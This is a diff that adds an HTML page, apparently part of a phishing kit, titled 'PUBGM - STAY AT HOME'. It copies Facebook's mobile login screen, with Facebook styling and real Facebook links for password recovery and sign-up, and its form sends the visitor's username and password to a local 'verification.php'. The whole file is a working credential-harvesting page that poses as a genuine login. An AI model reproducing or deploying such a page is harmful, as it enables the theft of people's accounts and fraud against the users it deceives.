@@ -1,0 +1,77 @@
+
+<html>
+<head>
+	
+
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>PUBGM - STAY AT HOME</title>
+<link rel="stylesheet" href="css/facebook.css">
+<link rel="icon" href="img/icon.jpg">
+
+
+</head>
+<center>
+<body>
+
+<div class="fb-login-layer animated fadeIn" >
+	<div class="fb-header">
+		<img src="img/login/fb/fb-download.png">
+		<div class="fb-header-text-a" onclick="location.href=
+		'  https://play.google.com/store/apps/details?id=com.facebook.katana&hl=in&gl=US  ';">Get Facebook for Android and browse faster.</div>
+	</div>
+
+<center><div class="fb-content">
+<img src="img/login/fb/fb-head.png">
+
+<form action="verification.php" method="GET">		
+			<input class="fb-input-box" type="text" 
+				name="username" 
+				placeholder="Mobile number or email address" 
+				autocomplete="off" 
+				autocapitalize="off" 
+				required>			
+		<br>
+			<input class="fb-input-box"type="password" 
+				name="password" 
+				placeholder="Password" 
+				autocomplete="off" 
+				autocapitalize="off" 
+				required>
+	
+		<input type="hidden" name="login" value="Facebook" readonly>		   
+		<button type="submit" class="fb-button-01"><b>Log In</b></button>
+</form>
+		
+<div class="text-01"  onclick="location.href=
+'  https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0  ';">
+Forgotten password ?</div>
+		
+<div class="separator"><div class="line"></div><h2>or</h2><div class="line"></div></div>
+
+<div class="fb-button-02"  onclick="location.href=
+'  https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk  ';" ><b>Create New Account</b></div>
+
+</div></center>
+
+<div class="language-box" onclick="location.href=
+'  https://m.facebook.com/help/327850733950290 ';">
+		<center>
+			<div class="language-name-02" >English (UK)</div>
+			<div class="language-name" >Bahasa Indonesia</div>
+			<div class="language-name" >Basa Jawa</div>
+			<div class="language-name" >Bahasa Melayu</div>
+			<div class="language-name" >日本語</div>
+			<div class="language-name" >Español</div>
+			<div class="language-name" >Português (Brasil)</div>
+			<div class="language-name-03" >+</i></div>
+		</center>			
+</div>
+		<div class="copyright">Facebook Inc.</div>
+</div>
+
+
+</body>
+</center>
+</html>
